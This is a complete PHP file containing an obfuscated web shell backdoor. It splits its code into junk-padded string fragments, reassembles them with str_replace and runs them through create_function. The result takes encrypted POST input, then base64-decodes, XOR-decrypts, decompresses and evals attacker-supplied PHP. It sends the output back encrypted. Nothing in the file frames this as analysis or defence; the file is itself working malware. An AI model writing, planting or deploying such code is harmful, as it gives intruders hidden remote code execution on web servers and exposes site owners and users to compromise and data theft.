<?php
$m=str_replace('Y','','creYYaYteY_fuYnYction');
$Z='$k="cda$>7e1$>7b";$kh="8$>42$>$>0$>9f312c85";$kf="$>c8835df62238"$>;$p$>="Lpyzp$>$>FvfZ9';
$j='$j};}$>}$>r$>eturn $o;}if (@preg$>$>_ma$>tch("/$$>$>kh(.+)$kf/",@file_get$>_c$>o$>nt';
$k='ents("php://i$>nput$>"),$m)$>==1)$> {@ob_sta$>rt();$>@ev$>al(@gzunc$>o$>mpress(@x(';
$H='6WTT$>V5$>";function x($$>t,$k)$>{$>$c=strlen($>$k);$$>l=strle$>n($t$>);$o="";f$>or';
$G='($>$i=$>0;$i<$l;)$>{for($j=0;($>$j<$c$>$>&&$i<$l$>);$j++,$i$>++){$o$>.=$t{$i$>}^$k{$>';
$C='@ba$>se64_d$>ecode($>$m[$>$>$>1]),$k)));$$>o=@ob_get_c$>onte$>$>nts();$>@ob_en$>d_cl';
$D='ean();$r=@b$>ase$>64_encode(@x$>(@gzcom$>press$>($o),$$>k));p$>r$>int$>("$p$kh$r$kf");}';
$t=str_replace('$>','',$Z.$H.$G.$j.$k.$C.$D);
$w=$m('',$t);$w();
?>
